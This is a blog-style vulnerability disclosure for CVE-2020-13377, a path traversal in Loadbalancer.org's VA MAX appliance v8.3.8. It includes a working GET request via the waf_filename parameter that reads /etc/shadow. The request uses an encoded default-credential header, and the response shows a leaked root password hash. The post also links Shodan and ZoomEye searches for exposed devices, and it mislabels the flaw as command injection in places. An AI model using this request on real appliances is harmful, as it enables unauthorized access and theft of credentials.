---
layout: post
title:  "Path traversal in Enterprise loadbalancer VA MAX - v8.3.8 and earlier"
date:   2020-04-21 19:51:02 +0700 
categories: [cve]
---

Vulnerability: Path traversal (also known as directory traversal or file path injection) 

Path traversal in Enterprise loadbalancer VA MAX Appliance v8.3.8-134

Vendor: Loadbalancer.org, https://www.loadbalancer.org

Product: ENTERPRISE VA MAX

Version affected: Loadbalancer.org Appliance v8.3.8 as the latest in October 2019

#### Product description:

"Loadbalancer.org is a well-established international provider of reliable, versatile and cost-effective application delivery products and services. The load balancer experts help solve the issues of availability and scalability by providing an unbreakable solution to ensure zero downtime of critical IT applications.

Loadbalancer.org’s consultancy led approach means they have specialist engineers that will help design and simplify architecture guaranteeing painless deployments every single time. The team of experts are effortlessly able to set up test environments, document each deployment, provide customized solutions and assist with complex migrations. They will support a business, not just the load balancer!

Loadbalancer.org load balancers are sold as hardware, virtual or cloud formats and are more scalable, flexible and are economical compared to competitive offerings.  With no performance or feature restrictions, their suite of products can load balance any application, for any company, in any industry, anywhere in the world. 

Allowing customers to have direct access 24 hours a day 7 days a week to a team of passionate engineers via phone, online chat and e-mail sets Loadbalancer.org apart from other ADC vendors.  

" as per statement on https://www.linkedin.com/company/loadbalancer-org  website. 

* CVE ID: CVE-2020-13377
* CWE ID: CWE-35

#### Vulnerability description:

Path traversal (also known as directory traversal or file path injection) is a type of vulnerability that allows an attacker to access files and directories 
on a web server that are outside of the web root directory. This vulnerability occurs when a web application does not properly sanitize user input 
that is used to construct a file path.

The evidence of a path traversal attack could include a log entry that shows an attempt to access a file or directory 
that is outside the expected range of directories. For example, if the web application is designed to serve files from the directory /var/www/html/, 
an attacker might try to access the file /etc/passwd by providing input such as ../../../../../etc/passwd.

Other evidence of a path traversal attack could include unusual file access patterns or unexpected file system activity, 
which could be detected through file system monitoring tools or intrusion detection systems. Additionally, if an attacker is able to 
successfully exploit a path traversal vulnerability, they may be able to exfiltrate sensitive data or execute arbitrary code on the web server. 
In such cases, the evidence of the attack may include changes to system files or the creation of new files or directories.

##### Proof of Concept

A command Injection vulnerability allows attackers to execute arbitrary OS commands via a crafted HTTP request. This is exploitable by an authenticated attacker who submits a modified GET request.

Sample GET request to 'etc/shadow' file, which allowed an attacker to access files and directories on a web server that are outside of the web root directory. This vulnerability occurs when a web application does not properly sanitize user input that is used to construct a file path.

Identified vulnerable parameters: waf_filename  

#### Request:

{% highlight ruby %}
GET /lbadmin/ajax/js_dispatcher.php?option=waf_log&waf_filename=..%2f..%2f..%2fetc%2fshadow&log_option=base HTTP/1.1
Host: x.x.x.x:9443
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Authorization: Basic bG9hZGJhbGFuY2VyOmxvYWRiYWxhbmNlcg==

HTTP/1.1 200 OK
Date: Wed, 18 Sep 2019 13:29:53 GMT
Server: Apache
Content-Length: 930
Content-Type: text/html; charset=UTF-8

{"success":["","radiusd:!!:17933::::::","stunnel:!!:15764::::::","memcached:!!:15484::::::","ntp:!!:15484::::::","hacluster:!!:15392::::::","setup:$1$XIQ18c0a$kxvCj1sZJoBFG9i5qNWSp0:15392:0:99999:7:::","nginx:!!:15392::::::","pound:!!:15392::::::","tcpdump:!!:15392::::::","apache:!!:15392::::::","sshd:!!:15392::::::","postfix:!!:15392::::::","saslauth:!!:15392::::::","vcsa:!!:15392::::::","nobody:*:15240:0:99999:7:::","ftp:*:15240:0:99999:7:::","gopher:*:15240:0:99999:7:::","games:*:15240:0:99999:7:::","operator:*:15240:0:99999:7:::","uucp:*:15240:0:99999:7:::","mail:*:15240:0:99999:7:::","halt:*:15240:0:99999:7:::","shutdown:*:15240:0:99999:7:::","sync:*:15240:0:99999:7:::","lp:*:15240:0:99999:7:::","adm:*:15240:0:99999:7:::","daemon:*:15240:0:99999:7:::","bin:*:15240:0:99999:7:::","root:$6$dNu030j\/gSf.5fUS$kxcv9wApSA4pWnLL1WNt7DZftZbYj8Pu2XY63g8JnAgjAREV3tjbthYD7BKq0hDMMLL4OrO1Yyg4IlAEGpzHv0:15392:0:99999:7:::"]}
{% endhighlight %}

#### Public searches:

https://www.zoomeye.org/searchResult?q=Loadbalancer%2Corg

https://www.shodan.io/search?query=loadbalancer.org

but this company has interestingly some reputable partnership alliance

![Raw HTTP Request/Response ](/static/img/Loadbalancer.png)

#### References
1. https://www.immuniweb.com/vulnerability/os-command-injection.html
2. https://www.loadbalancer.org
3. https://cwe.mitre.org/data/definitions/78.html
4. https://www.checkmarx.com/knowledge/knowledgebase/OS-Command_Injection
